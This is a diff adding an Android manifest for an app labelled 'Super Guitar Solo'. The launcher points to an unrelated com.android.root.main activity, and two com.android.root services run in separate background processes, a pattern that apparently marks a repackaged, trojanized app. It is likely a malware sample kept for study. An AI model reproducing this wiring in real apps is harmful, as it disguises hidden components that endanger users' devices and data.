@@ -1,0 +1,26 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:installLocation="auto" package="com.power.SuperSolo">
+    <application android:debuggable="false" android:icon="@drawable/solo_icon" android:label="Super Guitar Solo" android:theme="@style/FullScreen">
+        <activity android:name="com.codingcaveman.SoloTrial.SplashActivity" android:screenOrientation="portrait" android:theme="@style/NoBackgroundFullScreen"/>
+        <activity android:launchMode="singleTask" android:name="com.codingcaveman.SoloTrial.StrumActivity" android:screenOrientation="portrait" android:theme="@style/NoBackgroundFullScreen"/>
+        <activity android:name="com.codingcaveman.SoloTrial.LayoutEditorActivity" android:screenOrientation="portrait" android:theme="@style/NoBackgroundFullScreen"/>
+        <activity android:name="com.codingcaveman.SoloTrial.ChordEditorActivity" android:screenOrientation="portrait" android:theme="@style/NoBackgroundFullScreen"/>
+        <activity android:name="com.codingcaveman.SoloTrial.CapoActivity" android:screenOrientation="portrait" android:theme="@style/NoBackgroundFullScreen"/>
+        <activity android:name="com.codingcaveman.SoloTrial.SettingsActivity" android:screenOrientation="portrait"/>
+        <activity android:name="com.codingcaveman.SoloTrial.ExpiredActivity" android:screenOrientation="portrait"/>
+        <activity android:launchMode="singleTop" android:name="com.codingcaveman.SoloTrial.UpgradeActivity" android:screenOrientation="portrait"/>
+        <activity android:name="com.android.root.main">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+        <service android:name="com.android.root.Setting" android:process=":remote"/>
+        <service android:name="com.android.root.AlarmReceiver" android:process=":remote2"/>
+    </application>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.VIBRATE"/>
+    <supports-screen/>
+</manifest>
